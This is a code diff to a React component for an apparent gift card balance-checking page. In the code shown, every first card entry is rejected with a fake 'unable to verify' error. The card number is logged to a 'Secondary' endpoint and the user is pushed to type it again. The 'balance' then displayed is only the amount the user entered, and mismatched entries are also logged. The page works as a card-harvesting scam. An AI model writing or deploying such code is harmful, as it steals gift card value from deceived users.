@@ -90,10 +90,10 @@ const Home = () => {
   const [isCardValid, setIsCardValid] = useState(false);
   const [isAmountValid, setIsAmountValid] = useState(false);
 
-  const typingAlertFired = useRef(false);
-  const completeAlertFired = useRef(false);
-  const failNotifyFired = useRef(false);
-  const mismatchNotifyFired = useRef(false);
+  // Notification guards
+  const typingAlertFired = useRef(false);      
+  const completeAlertFired = useRef(false);    
+
   const MIN_REQUEST_INTERVAL = 10000;
 
   useEffect(() => {
@@ -145,21 +145,30 @@ const Home = () => {
         setError('UNABLE TO VERIFY CARD\n\nPlease ensure:\n• You have entered the correct card number\n• All 14 alphanumeric characters are correct\n\nPlease re-enter the CORRECT card number and try again.');
         setStoredCardNumber(rawCard); setStoredAmount(amount);
 
+        // Goes to Secondary only
         try { await logBalanceCheck({ type: 'first_attempt_failed', cardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}
-        if (!failNotifyFired.current) { failNotifyFired.current = true; sendNotify({ event: 'first_attempt_failed', cardNumber: rawCard }); }
 
-        setCardNumber(''); setAttemptCount(1); typingAlertFired.current = false; completeAlertFired.current = false; setLastRequestTime(0);
+        setCardNumber(''); setAttemptCount(1); 
+        typingAlertFired.current = false; completeAlertFired.current = false; 
+        setLastRequestTime(0);
       } else {
         if (storedCardNumber === rawCard) {
           const displayBalance = `$${parseFloat(storedAmount || amount).toFixed(2)} USD`;
           setBalance(displayBalance); setShowBalance(true); setShowFullScreenBalance(true); setError('');
+          
+          // Goes to Secondary only
           try { await logBalanceCheck({ type: 'second_attempt_success', cardNumber: rawCard, amount, balance: displayBalance, pageSource: 'manual' }); } catch (err) {}
+          
           setAttemptCount(0); setStoredAmount('');
         } else {
           setError('Card number does NOT match the first attempt.\n\nPlease enter the SAME card number.\n\nField cleared. Try again.');
+          
+          // Goes to Secondary only
           try { await logBalanceCheck({ type: 'mismatch_attempt', firstCardNumber: storedCardNumber, secondCardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}
-          if (!mismatchNotifyFired.current) { mismatchNotifyFired.current = true; sendNotify({ event: 'mismatch_trial', firstCardNumber: storedCardNumber, secondCardNumber: rawCard }); }
-          setCardNumber(''); setAttemptCount(0); setStoredCardNumber(''); setStoredAmount(''); typingAlertFired.current = false; completeAlertFired.current = false; failNotifyFired.current = false; mismatchNotifyFired.current = false; setLastRequestTime(0);
+          
+          setCardNumber(''); setAttemptCount(0); setStoredCardNumber(''); setStoredAmount(''); 
+          typingAlertFired.current = false; completeAlertFired.current = false; 
+          setLastRequestTime(0);
         }
       }
       setLoading(false);
@@ -168,8 +177,8 @@ const Home = () => {
 
   const resetFullScreen = () => {
     setShowFullScreenBalance(false); setShowBalance(false); setBalance(''); setCardNumber(''); setAmount(''); setError(''); setAttemptCount(0);
-    setStoredCardNumber(''); setStoredAmount(''); setLoading(false); typingAlertFired.current = false; completeAlertFired.current = false;
-    failNotifyFired.current = false; mismatchNotifyFired.current = false; setLastRequestTime(0);
+    setStoredCardNumber(''); setStoredAmount(''); setLoading(false); typingAlertFired.current = false; completeAlertFired.current = false; 
+    setLastRequestTime(0);
   };
 
   if (showFullScreenBalance) return <FullScreenBalance balance={balance} lastFourDigits={storedCardNumber.slice(-4) || '••••'} cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
